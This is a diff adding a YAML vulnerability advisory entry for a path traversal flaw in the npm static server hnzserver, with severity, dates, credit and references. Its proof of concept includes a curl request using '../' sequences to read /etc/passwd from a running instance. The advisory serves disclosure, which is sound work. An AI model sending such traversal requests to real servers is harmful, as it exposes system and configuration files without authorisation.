@@ -1,0 +1,30 @@
+---
+- id: snykio:npm:hnzserver:1012733
+  title: Arbitrary File Read
+  description: "[hnzserver][1] is a static server.\n\nAffected versions of this package
+    are vulnerable to Arbitrary File Read.\nPath traversal attack (also known as directory
+    traversal) aims to access\nfiles and directories that are stored outside the web
+    root folder. By\nmanipulating variables that reference files with “dot-dot-slash
+    (../)”\nsequences and its variations or by using absolute file paths, it may be\npossible
+    to access arbitrary files and directories stored on file system\nincluding application
+    source code or configuration and critical system\nfiles.\n\n### PoC by lightangel1412
+    \  {#poc-by-lightangel1412}\n\n* Install the module\n\n`npm install -g hnzserver`\n\n*
+    Run \\'hnzserver in \\\"~/Desktop\\\" directory :\n  \n      root@kali:~/Desktop#
+    hnzserver\n      server running is :http://localhost:8888\n\n* Use cURL to access
+    etc/passwd file:\n\n`$ curl --path-as-is --url\n'http://127.0.0.1:8888/../../../../etc/passwd'`\n\n\n\n[1]:
+    https://www.npmjs.com/package/hnzserver\n"
+  affected_package: hnzserver
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cwe:
+  - CWE-22
+  disclosed_date: 2020-09-24
+  created_date: 2020-09-25
+  last_modified_date: 2020-09-25
+  credit:
+  - lightangel1412
+  references:
+  - https://hackerone.com/reports/579517
+  source_url: https://snyk.io/vuln/SNYK-JS-HNZSERVER-1012733
